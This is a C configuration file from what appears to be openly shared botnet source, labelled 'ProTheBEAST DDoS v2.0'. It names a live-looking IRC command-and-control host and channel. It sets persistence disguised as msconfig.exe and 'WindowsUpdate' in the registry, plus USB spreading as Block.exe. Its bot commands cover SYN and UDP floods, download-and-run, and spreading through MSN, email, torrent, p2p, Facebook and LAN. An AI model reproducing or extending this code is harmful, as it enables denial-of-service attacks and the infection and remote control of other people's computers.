//////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////Kustom is Sex//////////////////////////////////////
////////////////////////////      Coded by PhobiiA///////////////////////////////
/////////////////////////////Highly private source////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////
ircconnect_s ircconnect[] =
{
	{"g52.no-ip.info", 6667, ""}, 
	{NULL, NULL, NULL}
};

/* Reconnect Config */
unsigned long cfg_reconnectsleep = 3000; // msec 
unsigned long cfg_ircmaxwaittime = 600; // sec
BOOL _inject = 1;
/* IRC Config */
char cfg_ircchannel[] =			"#Boss";
char cfg_infochan[] =			"#Boss";
char cfg_irchost[] =			"abc123";
char cfg_ircchanpass[] =		"abc123";
char cfg_ircorderprefix[] =		"!";
char cfg_version[] =			"\00311..:: ProTheBEAST DDoS v2.0 {Registered To: Pro } ::..";


/* Executable Config */
char cfg_mutex[]            = "1451w8ex132515bhg94bJQp";
char cfg_gotopth[]          = "%appdata%";
char cfg_filename[]         = "msconfig.exe";
char cfg_regname[]          = "WindowsUpdate";
char USB_STR_FILENAME[]		= "Block.exe";

/* Commands */ 
char cmd_silent[]     = "mute"; 	  	  
char cmd_join[]       = "j";
char cmd_part[]       = "p";
char cmd_download[]   = "w.get";     
char cmd_remove[]     = "gtfo";
char cmd_update[]     = "apt.get";
char cmd_botkill[]	  = "botkill";
char cmd_visit[]	  = "visit";
char cmd_speedtest[]  = "speed";
char cmd_ssyn[]		  = "s.flood"; 
char cmd_msn[]		  = "msn";
char cmd_unsort[]	  = "unsort";
char cmd_sort[]		  = "sort";
char cmd_udp[]		  = "u.flood";
char cmd_version[]	  = "version";
char cmd_torrent[]    = "torrent";
char cmd_email[]      = "mail";
char cmd_p2p[]		  = "p2p";
char cmd_fb[]	      = "fb";
char cmd_lan[]        = "lan";
char cmd_html[]       = "html";
char cmd_slow[]       = "slow";
/* DL crap */
char Download_Target[MAX_LINE];
char Download_URL[MAX_LINE];
char fromchan[MAX_LINE] = "";
char szUDP_Host[MAX_LINE];
int szUDP_Port;
int szUDP_Time;
int szUDP_Delay;


char string_nick[] = "NICK";
char string_join[] = "JOIN";
char string_part[] = "PART";
char string_quit[] = "QUIT";
char string_pass[] = "PASS";
char string_ping[] = "PING";
char string_pong[] = "PONG";
char string_user[] = "USER";
char string_privmsg[] = "PRIVMSG";

///Title stuff//The\0030number shit is for colors
char title_download[] = "[Download]:";
char title_main[] = "[Main]:";
char title_update[] = "[Update]:";
